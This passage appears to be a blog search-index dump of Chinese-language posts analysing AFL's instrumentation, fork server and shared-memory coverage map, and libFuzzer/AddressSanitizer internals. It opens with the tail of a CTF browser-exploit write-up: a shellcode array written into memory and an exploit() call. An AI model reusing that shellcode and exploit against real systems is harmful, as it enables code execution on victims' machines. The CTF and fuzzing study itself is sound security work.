0x7ed63ac7, 0x15479128, 0x75cb2b8a, 0x12579536, 0x67d12996, 0x4158807a, 0x24ca74cd, 0x4557d467, 0x67827bc8, 0x4019807a, 0x69dc2984, 0xd419037, 0x77d73495, 0x10458033, 0x47d62997, 0xaa3ff750, 0x47e01542, 0x77a006]; for(let i = 0; i &lt; shellcode.length; i++) { dv.setUint32(i * 4, shellcode[i], true); } f(1, 2); };exploit()","link":"/2019/05/06/Star-CTF-OOB-writeup/"},{"title":"AFL 初探（一）","text":"Intro: Basic Analysis of AFL AFL 初探 源码分析123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259static void add_instrumentation(void) { static u8 line[MAX_LINE]; FILE* inf; FILE* outf; s32 outfd; u32 ins_lines = 0; u8 instr_ok = 0, skip_csect = 0, skip_next_label = 0, skip_intel = 0, skip_app = 0, instrument_next = 0;#ifdef __APPLE__ u8* colon_pos;#endif /* __APPLE__ *///输入文件，gcc生成 if (input_file) { inf = fopen(input_file, &quot;r&quot;); if (!inf) PFATAL(&quot;Unable to read &apos;%s&apos;&quot;, input_file); } else inf = stdin;//输出文件 outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, 0600); if (outfd &lt; 0) PFATAL(&quot;Unable to write to &apos;%s&apos;&quot;, modified_file); outf = fdopen(outfd, &quot;w&quot;); if (!outf) PFATAL(&quot;fdopen() failed&quot;); //对于inf进行每行的遍历插桩 while (fgets(line, MAX_LINE, inf)) { /* In some cases, we want to defer writing the instrumentation trampoline until after all the labels, macros, comments, etc. If we&apos;re in this mode, and if the line starts with a tab followed by a character, dump the trampoline now. *///满足这些条件就插桩,条件由下面的扫描提供 if (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp; instrument_next &amp;&amp; line[0] == &apos;\\t&apos; &amp;&amp; isalpha(line[1])) { fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE)); instrument_next = 0; ins_lines++; } /* Output the actual line, call it a day in pass-thru mode. *///把原始的代码写入outf fputs(line, outf); if (pass_thru) continue; /* All right, this is where the actual fun begins. For one, we only want to instrument the .text section. So, let&apos;s keep track of that in processed files - and let&apos;s set instr_ok accordingly. *///判断代码段，只插桩.text段 if (line[0] == &apos;\\t&apos; &amp;&amp; line[1] == &apos;.&apos;) { /* OpenBSD puts jump tables directly inline with the code, which is a bit annoying. They use a specific format of p2align directives around them, so we use that as a signal. */ if (!clang_mode &amp;&amp; instr_ok &amp;&amp; !strncmp(line + 2, &quot;p2align &quot;, 8) &amp;&amp; isdigit(line[10]) &amp;&amp; line[11] == &apos;\\n&apos;) skip_next_label = 1; if (!strncmp(line + 2, &quot;text\\n&quot;, 5) || !strncmp(line + 2, &quot;section\\t.text&quot;, 13) || !strncmp(line + 2, &quot;section\\t__TEXT,__text&quot;, 21) || !strncmp(line + 2, &quot;section __TEXT,__text&quot;, 21)) { instr_ok = 1; continue; } if (!strncmp(line + 2, &quot;section\\t&quot;, 8) || !strncmp(line + 2, &quot;section &quot;, 8) || !strncmp(line + 2, &quot;bss\\n&quot;, 4) || !strncmp(line + 2, &quot;data\\n&quot;, 5)) { instr_ok = 0; continue; } } /* Detect off-flavor assembly (rare, happens in gdb). When this is encountered, we set skip_csect until the opposite directive is seen, and we do not instrument. *///判断位数 if (strstr(line, &quot;.code&quot;)) { if (strstr(line, &quot;.code32&quot;)) skip_csect = use_64bit; if (strstr(line, &quot;.code64&quot;)) skip_csect = !use_64bit; } /* Detect syntax changes, as could happen with hand-written assembly. Skip Intel blocks, resume instrumentation when back to AT&amp;T. */ if (strstr(line, &quot;.intel_syntax&quot;)) skip_intel = 1; if (strstr(line, &quot;.att_syntax&quot;)) skip_intel = 0; /* Detect and skip ad-hoc __asm__ blocks, likewise skipping them. */ if (line[0] == &apos;#&apos; || line[1] == &apos;#&apos;) { if (strstr(line, &quot;#APP&quot;)) skip_app = 1; if (strstr(line, &quot;#NO_APP&quot;)) skip_app = 0; } /* If we&apos;re in the right mood for instrumenting, check for function names or conditional labels. This is a bit messy, but in essence, we want to catch: ^main: - function entry point (always instrumented) ^.L0: - GCC branch label ^.LBB0_0: - clang branch label (but only in clang mode) ^\\tjnz foo - conditional branches ...but not: ^# BB#0: - clang comments ^ # BB#0: - ditto ^.Ltmp0: - clang non-branch labels ^.LC0 - GCC non-branch labels ^.LBB0_0: - ditto (when in GCC mode) ^\\tjmp foo - non-conditional jumps Additionally, clang and GCC on MacOS X follow a different convention with no leading dots on labels, hence the weird maze of #ifdefs later on. */ if (skip_intel || skip_app || skip_csect || !instr_ok || line[0] == &apos;#&apos; || line[0] == &apos; &apos;) continue; /* Conditional branch instruction (jnz, etc). We append the instrumentation right after the branch (to instrument the not-taken path) and at the branch destination label (handled later on). *///碰到jcc进行无条件插桩 if (line[0] == &apos;\\t&apos;) { if (line[1] == &apos;j&apos; &amp;&amp; line[2] != &apos;m&apos; &amp;&amp; R(100) &lt; inst_ratio) { fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE)); ins_lines++; } continue; }//label中均包含&quot;:&quot;,下面的工作就是匹配各种label /* Label of some sort. This may be a branch destination, but we need to tread carefully and account for several different formatting conventions. */#ifdef __APPLE__ /* Apple: L&lt;whatever&gt;&lt;digit&gt;: */ if ((colon_pos = strstr(line, &quot;:&quot;))) { if (line[0] == &apos;L&apos; &amp;&amp; isdigit(*(colon_pos - 1))) {#else /* Everybody else: .L&lt;whatever&gt;: *///匹配[.L&lt;wtever&gt;:] if (strstr(line, &quot;:&quot;)) { if (line[0] == &apos;.&apos;) {#endif /* __APPLE__ */ /* .L0: or LBB0_0: style jump destination */#ifdef __APPLE__ /* Apple: L&lt;num&gt; / LBB&lt;num&gt; */ if ((isdigit(line[1]) || (clang_mode &amp;&amp; !strncmp(line, &quot;LBB&quot;, 3))) &amp;&amp; R(100) &lt; inst_ratio) {#else /* Apple: .L&lt;num&gt; / .LBB&lt;num&gt; */ if ((isdigit(line[2]) || (clang_mode &amp;&amp; !strncmp(line + 1, &quot;LBB&quot;, 3))) &amp;&amp; R(100) &lt; inst_ratio) {#endif /* __APPLE__ */ /* An optimization is possible here by adding the code only if the label is mentioned in the code in contexts other than call / jmp. That said, this complicates the code by requiring two-pass processing (messy with stdin), and results in a speed gain typically under 10%, because compilers are generally pretty good about not generating spurious intra-function jumps. We use deferred output chiefly to avoid disrupting .Lfunc_begin0-style exception handling calculations (a problem on MacOS X). */ if (!skip_next_label) instrument_next = 1; else skip_next_label = 0; } } else { /* Function label (always instrumented, deferred mode). *///匹配到一个label，instrument_next=1 instrument_next = 1; } } }//最后插入一个 main_payload if (ins_lines) fputs(use_64bit ? main_payload_64 : main_payload_32, outf); if (input_file) fclose(inf); fclose(outf); if (!be_quiet) { if (!ins_lines) WARNF(&quot;No instrumentation targets found%s.&quot;, pass_thru ? &quot; (pass-thru mode)&quot; : &quot;&quot;); else OKF(&quot;Instrumented %u locations (%s-bit, %s mode, ratio %u%%).&quot;, ins_lines, use_64bit ? &quot;64&quot; : &quot;32&quot;, getenv(&quot;AFL_HARDEN&quot;) ? &quot;hardened&quot; : (sanitizer ? &quot;ASAN/MSAN&quot; : &quot;non-hardened&quot;), inst_ratio); }} afl-as.c文件中插桩的条件： 1234567891011121314/* In some cases, we want to defer writing the instrumentation trampoline until after all the labels, macros, comments, etc. If we&apos;re in this mode, and if the line starts with a tab followed by a character, dump the trampoline now. */if (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp; instrument_next &amp;&amp; line[0] == &apos;\\t&apos; &amp;&amp; isalpha(line[1])) { fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE)); instrument_next = 0; ins_lines++;} 具体看一下插进去的代码是什么： 通过fprintf()将格式化字符串添加到汇编文件的相应位置，只分析32位的情况，trampoline_fmt_32的具体内容如下：12345678910111213141516171819202122static const u8* trampoline_fmt_32 = &quot;\\n&quot; &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\\n&quot; &quot;\\n&quot; &quot;.align 4\\n&quot; &quot;\\n&quot; &quot;leal -16(%%esp), %%esp\\n&quot; &quot;movl %%edi, 0(%%esp)\\n&quot; &quot;movl %%edx, 4(%%esp)\\n&quot; &quot;movl %%ecx, 8(%%esp)\\n&quot; &quot;movl %%eax, 12(%%esp)\\n&quot; &quot;movl $0x%08x, %%ecx\\n&quot; &quot;call __afl_maybe_log\\n&quot; &quot;movl 12(%%esp), %%eax\\n&quot; &quot;movl 8(%%esp), %%ecx\\n&quot; &quot;movl 4(%%esp), %%edx\\n&quot; &quot;movl 0(%%esp), %%edi\\n&quot; &quot;leal 16(%%esp), %%esp\\n&quot; &quot;\\n&quot; &quot;/* --- END --- */\\n&quot; &quot;\\n&quot;; 其中，movl $0x%08x, %%ecx\\n 为将R(x)生成的随机数给ecx作为标识代码段的key。然后调用__afl_maybe_log，调用完之后，把栈上保存的值恢复回去，再把栈恢复。 main_payload_32: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263static const u8* main_payload_32 = &quot;\\n&quot; &quot;/* --- AFL MAIN PAYLOAD (32-BIT) --- */\\n&quot; &quot;\\n&quot; &quot;.text\\n&quot; &quot;.att_syntax\\n&quot; &quot;.code32\\n&quot; &quot;.align 8\\n&quot; &quot;\\n&quot;---//__afl_maybe_log: &quot;__afl_maybe_log:\\n&quot; &quot;\\n&quot; &quot; lahf\\n&quot; &quot; seto %al\\n&quot; &quot;\\n&quot; &quot; /* Check if SHM region is already mapped. */\\n&quot;---//判断共享内存是否加载，edx中存储SHM(__afl_area_ptr) &quot;\\n&quot; &quot; movl __afl_area_ptr, %edx\\n&quot; &quot; testl %edx, %edx\\n&quot; &quot; je __afl_setup\\n&quot; &quot;\\n&quot;---//__afl_store: &quot;__afl_store:\\n&quot; &quot;\\n&quot; &quot; /* Calculate and store hit for the code location specified in ecx. There\\n&quot; &quot; is a double-XOR way of doing this without tainting another register,\\n&quot; &quot; and we use it on 64-bit systems; but it&apos;s slower for 32-bit ones. */\\n&quot; &quot;\\n&quot;---//将pre和当前代码块的key进行异或，结果存储到edi#ifndef COVERAGE_ONLY &quot; movl __afl_prev_loc, %edi\\n&quot; &quot; xorl %ecx, %edi\\n&quot; &quot; shrl $1, %ecx\\n&quot; &quot; movl %ecx, __afl_prev_loc\\n&quot;#else &quot; movl %ecx, %edi\\n&quot;#endif /* ^!COVERAGE_ONLY */ &quot;\\n&quot;---//内存映射：edi为索引，edx为map，体现edge命中逻辑#ifdef SKIP_COUNTS &quot; orb $1, (%edx, %edi, 1)\\n&quot;#else &quot; incb (%edx, %edi, 1)\\n&quot;#endif /* ^SKIP_COUNTS */ &quot;\\n&quot;---//__afl_return &quot;__afl_return:\\n&quot; &quot;\\n&quot; &quot; addb $127, %al\\n&quot; &quot; sahf\\n&quot; &quot; ret\\n&quot; &quot;\\n&quot; &quot;.align 8\\n&quot; &quot;\\n&quot;---//__afl_setup &quot;__afl_setup:\\n&quot; &quot;\\n&quot; &quot; /* Do not retry setup if we had previous failures. */\\n&quot; &quot;\\n&quot; &quot; cmpb $0, __afl_setup_failure\\n&quot; &quot; jne __afl_return\\n&quot; &quot;\\n&quot; &quot; /* Map SHM, jumping to __afl_setup_abort if something goes wrong.\\n&quot; &quot; We do not save FPU/MMX/SSE registers here, but hopefully, nobody\\n&quot; &quot; will notice this early in the game. */\\n&quot; &quot;\\n&quot;---//寻找 SHM 共享内存 &quot; pushl %eax\\n&quot; &quot; pushl %ecx\\n&quot; &quot;\\n&quot; &quot; pushl $.AFL_SHM_ENV\\n&quot; &quot; call getenv\\n&quot; &quot; addl $4, %esp\\n&quot; &quot;\\n&quot; &quot; testl %eax, %eax\\n&quot; &quot; je __afl_setup_abort\\n&quot; &quot;\\n&quot; &quot; pushl %eax\\n&quot; &quot; call atoi\\n&quot; &quot; addl $4, %esp\\n&quot; &quot;\\n&quot;---//shmat参数:SHM ID = getenv(.AFL_SHM_ENV) &quot; pushl $0 /* shmat flags */\\n&quot; &quot; pushl $0 /* requested addr */\\n&quot; &quot; pushl %eax /* SHM ID */\\n&quot; &quot; call shmat\\n&quot; &quot; addl $12, %esp\\n&quot; &quot;\\n&quot; &quot; cmpl $-1, %eax\\n&quot; &quot; je __afl_setup_abort\\n&quot; &quot;\\n&quot;---//储存 SHM 地址到 __afl_area_ptr &quot; /* Store the address of the SHM region. */\\n&quot; &quot;\\n&quot; &quot; movl %eax, __afl_area_ptr\\n&quot; &quot; movl %eax, %edx\\n&quot; &quot;\\n&quot; &quot; popl %ecx\\n&quot; &quot; popl %eax\\n&quot; &quot;\\n&quot;---//__afl_forkserver &quot;__afl_forkserver:\\n&quot; &quot;\\n&quot; &quot; /* Enter the fork server mode to avoid the overhead of execve() calls. */\\n&quot; &quot;\\n&quot; &quot; pushl %eax\\n&quot; &quot; pushl %ecx\\n&quot; &quot; pushl %edx\\n&quot; &quot;\\n&quot; &quot; /* Phone home and tell the parent that we&apos;re OK. (Note that signals with\\n&quot; &quot; no SA_RESTART will mess it up). If this fails, assume that the fd is\\n&quot; &quot; closed because we were execve()d from an instrumented binary, or because\\n&quot; &quot; the parent doesn&apos;t want to use the fork server. */\\n&quot; &quot;\\n&quot;//将__afl_temp中的4个字节写到提前开好的管道中 &quot; pushl $4 /* length */\\n&quot; &quot; pushl $__afl_temp /* data */\\n&quot; &quot; pushl $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot; /* file desc */\\n&quot; &quot; call write\\n&quot; &quot; addl $12, %esp\\n&quot; &quot;\\n&quot; &quot; cmpl $4, %eax\\n&quot;//jne：不相等跳转，即fail跳转-&gt;__afl_fork_resume &quot; jne __afl_fork_resume\\n&quot; &quot;\\n&quot;---//__afl_fork_wait_loop: &quot;__afl_fork_wait_loop:\\n&quot; &quot;\\n&quot; &quot; /* Wait for parent by reading from the pipe. Abort if read fails. */\\n&quot; &quot;\\n&quot;//不断地从管道中读取内容，假如读取到的字节数不为4就会跳到__afl_die &quot; pushl $4 /* length */\\n&quot; &quot; pushl $__afl_temp /* data */\\n&quot; &quot; pushl $&quot; STRINGIFY(FORKSRV_FD) &quot; /* file desc */\\n&quot; &quot; call read\\n&quot; &quot; addl $12, %esp\\n&quot; &quot;\\n&quot; &quot; cmpl $4, %eax\\n&quot; &quot; jne __afl_die\\n&quot; &quot;\\n&quot; &quot; /* Once woken up, create a clone of our process. This is an excellent use\\n&quot; &quot; case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly\\n&quot; &quot; caches getpid() results and offers no way to update the value, breaking\\n&quot; &quot; abort(), raise(), and a bunch of other things :-( */\\n&quot; &quot;\\n&quot;//fork，判断fork是否成功，如果成功，子进程跳到__afl_fork_resume &quot; call fork\\n&quot; &quot;\\n&quot; &quot; cmpl $0, %eax\\n&quot; &quot; jl __afl_die\\n&quot; &quot; je __afl_fork_resume\\n&quot; &quot;\\n&quot;//父进程 write PID to pipe，传给 fuzzer &quot; /* In parent process: write PID to pipe, then wait for child. */\\n&quot; &quot;\\n&quot; &quot; movl %eax, __afl_fork_pid\\n&quot; &quot;\\n&quot; &quot; pushl $4 /* length */\\n&quot; &quot; pushl $__afl_fork_pid /* data */\\n&quot; &quot; pushl $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot; /* file desc */\\n&quot; &quot; call write\\n&quot; &quot; addl $12, %esp\\n&quot; &quot;\\n&quot;//如果waitpid返回的结果小于等于0，就会跳到afl_die，同时状态传入__afl_temp &quot; pushl $0 /* no flags */\\n&quot; &quot; pushl $__afl_temp /* status */\\n&quot; &quot; pushl __afl_fork_pid /* PID */\\n&quot; &quot; call waitpid\\n&quot; &quot; addl $12, %esp\\n&quot; &quot;\\n&quot; &quot; cmpl $0, %eax\\n&quot; &quot; jle __afl_die\\n&quot; &quot;\\n&quot; &quot; /* Relay wait status to pipe, then loop back. */\\n&quot;//状态通过管道传回fuzzer，同时启动新一轮等待 &quot;\\n&quot; &quot; pushl $4 /* length */\\n&quot; &quot; pushl $__afl_temp /* data */\\n&quot; &quot; pushl $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot; /* file desc */\\n&quot; &quot; call write\\n&quot; &quot; addl $12, %esp\\n&quot; &quot;\\n&quot; &quot; jmp __afl_fork_wait_loop\\n&quot; &quot;\\n&quot;---//__afl_fork_resume： &quot;__afl_fork_resume:\\n&quot; &quot;\\n&quot;//管道关闭，寄存器恢复 &quot; /* In child process: close fds, resume execution. */\\n&quot; &quot;\\n&quot; &quot; pushl $&quot; STRINGIFY(FORKSRV_FD) &quot;\\n&quot; &quot; call close\\n&quot; &quot;\\n&quot; &quot; pushl $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;\\n&quot; &quot; call close\\n&quot; &quot;\\n&quot; &quot; addl $8, %esp\\n&quot; &quot;\\n&quot; &quot; popl %edx\\n&quot; &quot; popl %ecx\\n&quot; &quot; popl %eax\\n&quot;//跳转到__afl_store： &quot; jmp __afl_store\\n&quot; &quot;\\n&quot; &quot;__afl_die:\\n&quot; &quot;\\n&quot; &quot; xorl %eax, %eax\\n&quot; &quot; call _exit\\n&quot; &quot;\\n&quot; &quot;__afl_setup_abort:\\n&quot; &quot;\\n&quot; &quot; /* Record setup failure so that we don&apos;t keep calling\\n&quot; &quot; shmget() / shmat() over and over again. */\\n&quot; &quot;\\n&quot; &quot; incb __afl_setup_failure\\n&quot; &quot; popl %ecx\\n&quot; &quot; popl %eax\\n&quot; &quot; jmp __afl_return\\n&quot; &quot;\\n&quot; &quot;.AFL_VARS:\\n&quot; &quot;\\n&quot; &quot; .comm __afl_area_ptr, 4, 32\\n&quot; &quot; .comm __afl_setup_failure, 1, 32\\n&quot;#ifndef COVERAGE_ONLY &quot; .comm __afl_prev_loc, 4, 32\\n&quot;#endif /* !COVERAGE_ONLY */ &quot; .comm __afl_fork_pid, 4, 32\\n&quot; &quot; .comm __afl_temp, 4, 32\\n&quot; &quot;\\n&quot; &quot;.AFL_SHM_ENV:\\n&quot; &quot; .asciz \\&quot;&quot; SHM_ENV_VAR &quot;\\&quot;\\n&quot; &quot;\\n&quot; &quot;/* --- END --- */\\n&quot; &quot;\\n&quot;;/* The OpenBSD hack is due to lahf and sahf not being recognized by some versions of binutils: http://marc.info/?l=openbsd-cvs&amp;m=141636589924400 The Apple code is a bit different when calling libc functions because they are doing relocations differently from everybody else. We also need to work around the crash issue with .lcomm and the fact that they don&apos;t recognize .string. */#ifdef __APPLE__# define CALL_L64(str) &quot;call _&quot; str &quot;\\n&quot;#else# define CALL_L64(str) &quot;call &quot; str &quot;@PLT\\n&quot;#endif /* ^__APPLE__ */ 特别的，对于llvm模式，代码插桩仅需一个modulepass，对每个 BB 进行 IRB 的辅助插桩即可123456789101112131415161718192021222324252627282930313233343536373839404142434445for (auto &amp;F : M) for (auto &amp;BB : F) { BasicBlock::iterator IP = BB.getFirstInsertionPt(); IRBuilder&lt;&gt; IRB(&amp;(*IP)); if (AFL_R(100) &gt;= inst_ratio) continue; /* Make up cur_loc */ unsigned int cur_loc = AFL_R(MAP_SIZE); ConstantInt *CurLoc = ConstantInt::get(Int32Ty, cur_loc); /* Load prev_loc */ LoadInst *PrevLoc = IRB.CreateLoad(AFLPrevLoc); PrevLoc-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None)); Value *PrevLocCasted = IRB.CreateZExt(PrevLoc, IRB.getInt32Ty()); /* Load SHM pointer */ //shared memory table LoadInst *MapPtr = IRB.CreateLoad(AFLMapPtr); MapPtr-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None)); Value *MapPtrIdx = IRB.CreateGEP(MapPtr, IRB.CreateXor(PrevLocCasted, CurLoc)); /* Update bitmap */ LoadInst *Counter = IRB.CreateLoad(MapPtrIdx); Counter-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None)); Value *Incr = IRB.CreateAdd(Counter, ConstantInt::get(Int8Ty, 1)); IRB.CreateStore(Incr, MapPtrIdx) -&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None)); /* Set prev_loc to cur_loc &gt;&gt; 1 */ StoreInst *Store = IRB.CreateStore(ConstantInt::get(Int32Ty, cur_loc &gt;&gt; 1), AFLPrevLoc); Store-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None)); inst_blocks++; } 现在在回到fuzz侧，还记得forksrv的wait状态吗？fuzzer对于wait状态的解除是通过进行用例测试，在fork server启动完成后，一旦需要执行某个测试用例，则fuzzer会调用run_target()方法，在此方法中，便是通过命令管道，通知fork_server准备fork；并通过状态管道，获取子进程pid：123456789101112131415if ((res = write(fsrv_ctl_fd, &amp;prev_timed_out, 4)) != 4) { if (stop_soon) return 0; RPFATAL(res, &quot;Unable to request new process from fork server (OOM?)&quot;);}if ((res = read(fsrv_st_fd, &amp;child_pid, 4)) != 4) { if (stop_soon) return 0; RPFATAL(res, &quot;Unable to request new process from fork server (OOM?)&quot;);}if (child_pid &lt;= 0) FATAL(&quot;Fork server is misbehaving (OOM?)&quot;); 随后，fuzzer再次读取状态管道，获取子进程退出状态，并由此来判断子进程结束的原因，例如正常退出、超时、崩溃等，并进行相应的记录。12345678910111213 if ((res = read(fsrv_st_fd, &amp;status, 4)) != 4) {... /* Report outcome to caller. */ if (WIFSIGNALED(status) &amp;&amp; !stop_soon) { kill_signal = WTERMSIG(status); if (child_timed_out &amp;&amp; kill_signal == SIGKILL) return FAULT_TMOUT; return FAULT_CRASH; } Fork Server（结合上述源码） 【afl-fuzz.cc:!forksrv_pid】fuzzer进程执行fork()得到fork server进程，然后重定向两个管道作为通信接口，并关闭不必要的管道。其中设置了 SAN。然后执行 target。此为forksrv_init 12345678910111213141516 if (!forksrv_pid) {... if (dup2(ctl_pipe[0], FORKSRV_FD) &lt; 0) PFATAL(&quot;dup2() failed&quot;); if (dup2(st_pipe[1], FORKSRV_FD + 1) &lt; 0) PFATAL(&quot;dup2() failed&quot;);... close(ctl_pipe[0]); close(ctl_pipe[1]); close(st_pipe[0]); close(st_pipe[1]);... setenv(&quot;ASAN_OPTIONS&quot;, &quot;abort_on_error=1:&quot; &quot;detect_leaks=0:&quot; &quot;symbolize=0:&quot; &quot;allocator_may_return_null=1&quot;, 0);... execv(target_path, argv); 对于父进程（fuzzer），则会读取状态管道的信息，如果一切正常，则说明fork server创建完成。 12345678910 fsrv_st_fd = st_pipe[0]... rlen = read(fsrv_st_fd, &amp;status, 4);... /* If we have a four-byte &quot;hello&quot; message from the server, we&apos;re all set. Otherwise, try to figure out what went wrong. */ if (rlen == 4) { OKF(&quot;All right - fork server is up.&quot;); return; } 共享内存作为fuzzer，AFL并不是像无头苍蝇那样对输入文件无脑地随机变化（其实也支持这种方式，即dumb模式），其最大特点就是会对target进行插桩，以辅助mutated input的生成。具体地，插桩后的target，会记录执行过程中的分支信息；随后，fuzzer便可以根据这些信息，判断这次执行的整体流程和代码覆盖情况。 AFL使用共享内存，来完成以上信息在fuzzer和target之间的传递。具体地，fuzzer在启动时，会执行setup_shm()方法进行配置。其首先调用shemget()分配一块共享内存，大小MAP_SIZE为64K:1shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | 0600); 分配成功后，该共享内存的标志符会被设置到环境变量中，从而之后fork()得到的子进程可以通过该环境变量，得到这块共享内存的标志符：12shm_str = alloc_printf(&quot;%d&quot;, shm_id);if (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, 1); 并且，fuzzer本身，会使用变量trace_bits来保存共享内存的地址：1trace_bits = shmat(shm_id, NULL, 0); 在每次target执行之前，fuzzer首先将该共享内容清零：1memset(trace_bits, 0, MAP_SIZE); 接下来，我们再来看看target是如何获取并使用这块共享内存的。相关代码同样也在上面提到的方法__afl_maybe_log()中。首先，会检查是否已经将共享内存映射完成：12 分支信息的记录[warning] AFL 保存的是 edges 执行次数而不是 blocks 执行次数,AFL是根据二元tuple(跳转的源地址和目标地址)来记录分支信息，从而获取target的执行流程和代码覆盖情况，其伪代码如下：123cur_location = &lt;COMPILE_TIME_RANDOM&gt;;shared_mem[cur_location ^ prev_location]++; prev_location = cur_location &gt;&gt; 1; 其中的代码在上述源码分析中可以找到（包含llvm_pass） AFL文件变异这一部分先挖坑，因为没有具体阅读源码，只是收集到的资料，源码部分之后会补上 bitflip [自动检测token]: 在进行bitflip 1/1变异时，对于每个byte的最低位(least significant bit)翻转还进行了额外的处理：如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致，那么就把这一段连续的bytes判断是一条token。 [生成effector map]: 在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的。 arithmetic加减 interest特殊语料库的替换 dictionaryhavocsplicecycle一个AFL优化策略引用：12345为此，我对ELF文件变异和objdump执行路径变异进行了简单的试验，发现许多”数据“bytes被翻转后，确实能够引起执行路径的变化。但是，这些”数据“bytes往往是一块块分布在文件中的，而每一块”数据“中的每个bytes被翻转后，执行路径往往是相同的。所以，我们就有了一个朴素的想法：如果翻转一个byte引起执行路径变化，而且翻转该byte与翻转其前一个byte的执行路径不同，此时才将其视为“有效”的。","link":"/2019/03/20/AFL-初探/"},{"title":"libfuzzer & LLVM 初探","text":"Intro: Analysis of libfuzzer &amp;&amp; LLVM libfuzzer build编译流程环境Ubuntu16.0412345git clone https://github.com/Dor1s/libfuzzer-workshop.gitsudo sh checkout_build_install_llvm.shsudo apt-get install -ymake autoconf automake libtool pkg-config zlib1g-devcd libfuzzer-workshop/libFuzzerFuzzer/build.sh 【+】libfuzzer-workship 趁着编译的时候去详细了解一下libfuzzer其中的内存监控算法【+】AddressSanitizer 【+】AddressSanitizer 分析 【+】AddressSanitizer csdn The run-time library replaces the malloc and free functions. The memory around malloc-ed regions (red zones) is poisoned. The free-ed memory is placed in quarantine and also poisoned. ==Every memory access in the program is transformed by the compiler in the following way:== Before: 变量赋值1*address = ...; // or: ... = *address; After：加上检测1234if (IsPoisoned(address)) { ReportError(address, kAccessSize, kIsWrite);}*address = ...; // or: ... = *address; Memory mapping and Instrumentation shadwos 和 main memory 编译器进行了如下插桩1234shadow_address = MemToShadow(address);if (ShadowIsPoisoned(shadow_address)) { Repozhuang&apos;tai&apos;yrtError(address, kAccessSize, kIsWrite);} 并且针对shadows的one byte进行了与main memory的状态映射1234567891011121314byte *shadow_address = MemToShadow(address);byte shadow_value = *shadow_address;if (shadow_value) { if (SlowPathCheck(shadow_value, address, kAccessSize)) { ReportError(address, kAccessSize, kIsWrite); }}// Check the cases where we access first k bytes of the qword// and these k bytes are unpoisoned.bool SlowPathCheck(shadow_value, address, kAccessSize) { last_accessed_byte = (address &amp; 7) + kAccessSize - 1; return (last_accessed_byte &gt;= shadow_value);} 针对全内存，判断poison==0 ：fastpath 针对非全内存，SlowPathCheck，(last_accessed_byte:最后写入的数据大小；shadow_value：能写入的数据大小) 针对部分fastpath不能满足的非对齐oob访问，我的想法是干脆放弃fastpath转用slowpath，结果看了issue发现确实是这样，但是有一定的性能损耗，得不偿失。 研究这部分算法也是得不偿失然鹅。。 对于栈做了如下插桩：12345678910111213void foo() { char redzone1[32]; // 32-byte aligned char a[8]; // 32-byte aligned char redzone2[24]; char redzone3[32]; // 32-byte aligned int *shadow_base = MemToShadow(redzone1); shadow_base[0] = 0xffffffff; // poison redzone1 shadow_base[1] = 0xffffff00; // poison redzone2, unpoison &apos;a&apos; shadow_base[2] = 0xffffffff; // poison redzone3 ... shadow_base[0] = shadow_base[1] = shadow_base[2] = 0; // unpoison all return;} addresssanitize 源码分析：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647bool AddressSanitizerModule::runOnModule(Module &amp;M) { C = &amp;(M.getContext()); int LongSize = M.getDataLayout().getPointerSizeInBits(); IntptrTy = Type::getIntNTy(*C, LongSize); TargetTriple = Triple(M.getTargetTriple()); Mapping = getShadowMapping(TargetTriple, LongSize, CompileKernel); initializeCallbacks(M); if (CompileKernel) return false; // Create a module constructor. A destructor is created lazily because not all // platforms, and not all modules need it. std::string VersionCheckName = kAsanVersionCheckNamePrefix + std::to_string(GetAsanVersion(M)); std::tie(AsanCtorFunction, std::ignore) = createSanitizerCtorAndInitFunctions( M, kAsanModuleCtorName, kAsanInitName, /*InitArgTypes=*/{}, /*InitArgs=*/{}, VersionCheckName); bool CtorComdat = true; bool Changed = false; // TODO(glider): temporarily disabled globals instrumentation for KASan. if (ClGlobals) { IRBuilder&lt;&gt; IRB(AsanCtorFunction-&gt;getEntryBlock().getTerminator()); Changed |= InstrumentGlobals(IRB, M, &amp;CtorComdat); } // Put the constructor and destructor in comdat if both // (1) global instrumentation is not TU-specific // (2) target is ELF. 